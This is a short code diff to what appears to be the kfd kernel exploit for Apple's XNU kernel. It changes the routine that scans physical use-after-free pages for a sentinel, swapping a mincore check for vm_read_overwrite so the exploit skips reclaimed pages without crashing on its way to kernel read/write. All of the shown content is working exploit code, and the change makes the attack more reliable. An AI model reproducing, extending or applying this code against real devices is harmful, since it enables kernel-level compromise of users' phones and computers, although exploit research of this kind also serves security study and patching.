@@ -144,16 +144,24 @@ void krkw_helper_grab_free_pages(struct kfd* kfd)
         for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
             u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
             /*
-             * Guard against the page being reclaimed by PPL between PUAF and
-             * grab_free_pages: vm_copy may have re-mapped it, but a subsequent
-             * pmap operation could have unmapped it again. Check via mincore
-             * before memcmp to avoid SIGBUS / EXC_BAD_ACCESS.
+             * Guard against the page being reclaimed (mapped but no-access, or
+             * fully unmapped) between PUAF and grab_free_pages.
+             * Direct memcmp causes SIGBUS (KERN_PROTECTION_FAILURE) or SIGSEGV.
+             * Use vm_read_overwrite instead — it returns a kern_return_t error
+             * rather than crashing when the page is inaccessible.
              */
-            char vec = 0;
-            if (mincore((void*)(puaf_page_uaddr), 1, &vec) != 0) {
+            char sentinel_buf[info_copy_sentinel_size];
+            vm_size_t bytes_read = 0;
+            kern_return_t read_kret = vm_read_overwrite(
+                mach_task_self(),
+                puaf_page_uaddr,
+                info_copy_sentinel_size,
+                (vm_address_t)(sentinel_buf),
+                &bytes_read);
+            if (read_kret != KERN_SUCCESS || bytes_read != info_copy_sentinel_size) {
                 continue;
             }
-            if (!memcmp(info_copy_sentinel, (void*)(puaf_page_uaddr), info_copy_sentinel_size)) {
+            if (!memcmp(info_copy_sentinel, sentinel_buf, info_copy_sentinel_size)) {
                 if (++grabbed_puaf_pages == grabbed_puaf_pages_goal) {
                     print_u64(grabbed_free_pages);
                     timer_end();
